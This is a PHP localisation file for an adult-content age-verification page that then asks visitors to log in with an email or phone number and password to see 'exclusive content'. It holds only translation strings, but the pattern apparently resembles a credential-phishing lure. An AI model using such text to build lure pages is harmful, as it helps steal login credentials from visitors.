<?php
$browser_lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2) : 'es';

$translations = [
    'es' => [
        'title' => '¿Tienes 18 años o más?',
        'desc' => 'Este sitio contiene material exclusivo y restringido para adultos. Por favor, confirma tu edad para continuar.',
        'yes' => 'Sí, tengo 18 años o más',
        'no' => 'No, soy menor de edad',
        'security' => 'Verificación segura y confidencial',
        'loading_text' => 'Verificando edad...',
        'completed_text' => 'Verificación completada para ver el contenido exclusivo',
        'no_access' => 'Acceso restringido para menores de edad.',
        'login_title' => 'Iniciar Sesión',
        'login_alert' => 'Debes iniciar sesión para ver el contenido exclusivo.',
        'ph_email' => 'Correo electrónico o número de teléfono',
        'ph_pass' => 'Contraseña',
        'btn_login' => 'Iniciar Sesión',
        'btn_login_loading' => 'Entrando...',
        'forgot_pass' => '¿Has olvidado tu contraseña?'
    ],
    'en' => [
        'title' => 'Are you 18 or older?',
        'desc' => 'This site contains exclusive and restricted content for adults. Please confirm your age to continue.',
        'yes' => 'Yes, I am 18 or older',
        'no' => 'No, I am under 18',
        'security' => 'Secure and confidential verification',
        'loading_text' => 'Verifying age...',
        'completed_text' => 'Verification completed to view exclusive content',
        'no_access' => 'Restricted access for minors.',
        'login_title' => 'Log In',
        'login_alert' => 'You must log in to view exclusive content.',
        'ph_email' => 'Email or phone number',
        'ph_pass' => 'Password',
        'btn_login' => 'Log In',
        'btn_login_loading' => 'Logging in...',
        'forgot_pass' => 'Forgot password?'
    ],
    'pt' => [
        'title' => 'Você tem 18 anos ou mais?',
        'desc' => 'Este site contém material exclusivo e restrito para adultos. Por favor, confirme sua idade para continuar.',
        'yes' => 'Sim, tenho 18 anos ou mais',
        'no' => 'Não, sou menor de idade',
        'security' => 'Verificação segura e confidencial',
        'loading_text' => 'Verificando idade...',
        'completed_text' => 'Verificação concluída para ver o conteúdo exclusivo',
        'no_access' => 'Acesso restrito para menores de idade.',
        'login_title' => 'Entrar',
        'login_alert' => 'Você deve fazer login para ver o conteúdo exclusivo.',
        'ph_email' => 'Email ou número de telefone',
        'ph_pass' => 'Senha',
        'btn_login' => 'Entrar',
        'btn_login_loading' => 'Entrando...',
        'forgot_pass' => 'Esqueceu a senha?'
    ],
    'fr' => [
        'title' => 'Avez-vous 18 ans ou plus ?',
        'desc' => 'Ce site contient du contenu exclusif réservé aux adultes. Veuillez confirmer votre âge pour continuer.',
        'yes' => 'Oui, j\'ai 18 ans ou plus',
        'no' => 'Non, je suis mineur',
        'security' => 'Vérification sécurisée et confidentielle',
        'loading_text' => 'Vérification de l\'âge...',
        'completed_text' => 'Vérification terminée pour voir le contenu exclusif',
        'no_access' => 'Accès restreint aux mineurs.',
        'login_title' => 'Se connecter',
        'login_alert' => 'Vous devez vous connecter pour voir le contenu exclusif.',
        'ph_email' => 'E-mail ou numéro de téléphone',
        'ph_pass' => 'Mot de passe',
        'btn_login' => 'Se connecter',
        'btn_login_loading' => 'Connexion...',
        'forgot_pass' => 'Mot de passe oublié ?'
    ],
    'de' => [
        'title' => 'Sind Sie 18 Jahre oder älter?',
        'desc' => 'Diese Website enthält exklusive Inhalte für Erwachsene. Bitte bestätigen Sie Ihr Alter, um fortzufahren.',
        'yes' => 'Ja, ich bin 18 oder älter',
        'no' => 'Nein, ich bin minderjährig',
        'security' => 'Sichere und vertrauliche Überprüfung',
        'loading_text' => 'Altersüberprüfung...',
        'completed_text' => 'Überprüfung abgeschlossen, um exklusive Inhalte anzusehen',
        'no_access' => 'Zugriff für Minderjährige nicht gestattet.',
        'login_title' => 'Anmelden',
        'login_alert' => 'Sie müssen sich anmelden, um exklusive Inhalte zu sehen.',
        'ph_email' => 'E-Mail-Adresse oder Telefonnummer',
        'ph_pass' => 'Passwort',
        'btn_login' => 'Anmelden',
        'btn_login_loading' => 'Anmeldung...',
        'forgot_pass' => 'Passwort vergessen?'
    ],
    'it' => [
        'title' => 'Hai 18 anni o più?',
        'desc' => 'Questo sito contiene materiale esclusivo e riservato ad un pubblico adulto. Conferma la tua età per continuare.',
        'yes' => 'Sì, ho 18 anni o più',
        'no' => 'No, sono minorenne',
        'security' => 'Verifica sicura e confidenziale',
        'loading_text' => 'Verifica dell\'età...',
        'completed_text' => 'Verifica completata per visualizzare i contenuti esclusivi',
        'no_access' => 'Accesso vietato ai minori.',
        'login_title' => 'Accedi',
        'login_alert' => 'Devi accedere per visualizzare i contenuti esclusivi.',
        'ph_email' => 'Email o numero di telefono',
        'ph_pass' => 'Password',
        'btn_login' => 'Accedi',
        'btn_login_loading' => 'Accesso...',
        'forgot_pass' => 'Password dimenticata?'
    ]
];

$lang = array_key_exists($browser_lang, $translations) ? $browser_lang : 'es';
$t = $translations[$lang];
?>
